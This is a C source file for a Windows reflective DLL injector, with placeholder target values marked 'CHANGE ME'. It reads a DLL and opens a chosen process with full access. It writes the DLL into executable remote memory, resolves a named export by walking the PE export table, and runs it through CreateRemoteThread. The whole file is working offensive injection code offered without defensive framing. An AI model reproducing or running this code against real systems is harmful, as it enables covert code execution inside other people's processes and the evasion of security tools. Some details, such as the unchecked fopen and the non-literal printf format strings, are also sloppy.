#include "process.h"


typedef struct {

    FILE * hFile;
    long filesize;

} FILE_ATTR,*PFILE_ATTR;

 

FILE_ATTR FileSize(char * dllpath){
    FILE_ATTR file;
    file.hFile = fopen(dllpath,"rb");
    fseek(file.hFile,0,SEEK_END);
    file.filesize = ftell(file.hFile);
    rewind(file.hFile);

    return file;



}

DWORD function(DWORD RVA,IMAGE_SECTION_HEADER * pSection,IMAGE_NT_HEADERS * pNtHeaders){
    DWORD FileOffset;
    for(int i = 0; i < pNtHeaders->FileHeader.NumberOfSections;i++){
        DWORD SectionStart = pSection[i].VirtualAddress;
        DWORD SectionEnd = SectionStart + pSection[i].Misc.VirtualSize;

        if(RVA >= SectionStart && RVA < SectionEnd){
            FileOffset = RVA - pSection[i].VirtualAddress + pSection[i].PointerToRawData;
            return FileOffset;
          
        }

}
return NULL;
}


void * ExportFuction(FILE_ATTR * file,HANDLE hProc,unsigned char * memory){
    LPVOID remote;
    remote =  VirtualAllocEx(hProc, 0, file->filesize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    printf("%d",file->filesize);
    WriteProcessMemory(hProc, remote, memory, file->filesize, NULL);
    BYTE * BaseAddress = (BYTE *)memory;
    void * ProcAddress = NULL;
    IMAGE_DOS_HEADER * pDosHeader = (IMAGE_DOS_HEADER *)BaseAddress;
    if(pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    IMAGE_NT_HEADERS * pNtHeaders = (IMAGE_NT_HEADERS *)(BaseAddress + pDosHeader->e_lfanew);
    if(pNtHeaders->Signature != IMAGE_NT_SIGNATURE) printf("Not a NT Signature!");
    IMAGE_OPTIONAL_HEADER * pOptionalHeader = (IMAGE_OPTIONAL_HEADER *)&pNtHeaders->OptionalHeader;
    IMAGE_DATA_DIRECTORY * pDataDirectory = (IMAGE_DATA_DIRECTORY *)&pOptionalHeader->DataDirectory[0];
    DWORD ExportRVA = pDataDirectory->VirtualAddress;
    IMAGE_SECTION_HEADER * pSection = (IMAGE_SECTION_HEADER *)((BYTE *)&pNtHeaders->OptionalHeader + pNtHeaders->FileHeader.SizeOfOptionalHeader);
    DWORD FileOffset = function(ExportRVA,pSection,pNtHeaders);
    
    IMAGE_EXPORT_DIRECTORY * pExportDirectory = (IMAGE_EXPORT_DIRECTORY *)(BaseAddress + FileOffset);
    DWORD AddressOfNameOffset = function(pExportDirectory->AddressOfNames,pSection,pNtHeaders);
    DWORD AddressOfFunctionsOffset = function(pExportDirectory->AddressOfFunctions,pSection,pNtHeaders);
    DWORD AddressOfNameOrdinalsOffset = function(pExportDirectory->AddressOfNameOrdinals,pSection,pNtHeaders);
    
    DWORD * pName = (DWORD *)(BaseAddress + AddressOfNameOffset);
    DWORD * pFunctions = (DWORD * )(BaseAddress + AddressOfFunctionsOffset);
    WORD * pOrdinals = (WORD *)(BaseAddress + AddressOfNameOrdinalsOffset);



   
    for (int n = 0; n < pExportDirectory->NumberOfNames; n++)
    {
        DWORD NamesRVA = function(pName[n],pSection,pNtHeaders);
        char * sTemp = (char *) (BaseAddress + NamesRVA);
        printf(sTemp);
        if(strcmp(sTemp,"?Reflecting@@YAXXZ")==0){ //CHANGE ME
     
        
        DWORD pFunctionOffset = function(pFunctions[pOrdinals[n]],pSection,pNtHeaders);
        ProcAddress = (void *)((BYTE *)remote + pFunctionOffset);
        break;
        }
        
    
           
    }
    if(ProcAddress !=NULL){
        return ProcAddress;
    }
    
        
        
    

    return NULL;

}



int main() {
    unsigned char * buffer;
    HANDLE hProc;
    FILE_ATTR file;
    HANDLE th;
    int pid;


    
    file = FileSize("CHANGE ME"); //CHANGE ME

    printf("File size: %d bytes\n", file.filesize);

    buffer = (unsigned char *)malloc(file.filesize);
    
    fread(buffer, 1, file.filesize, file.hFile);
    pid = FindTarget("TARGET"); //CHANGE ME
    printf("Process ID: %d\n", pid); 
    hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid); 

    
    if(hProc != NULL){
    void * Exported = ExportFuction(&file,hProc,buffer);
    printf("%p",Exported);
    getchar();
    th = CreateRemoteThread(hProc,0,0,(LPTHREAD_START_ROUTINE)Exported,0,0,0);
    if(th !=NULL){
        WaitForSingleObject(th,500);
        CloseHandle(th);
    }
}







}



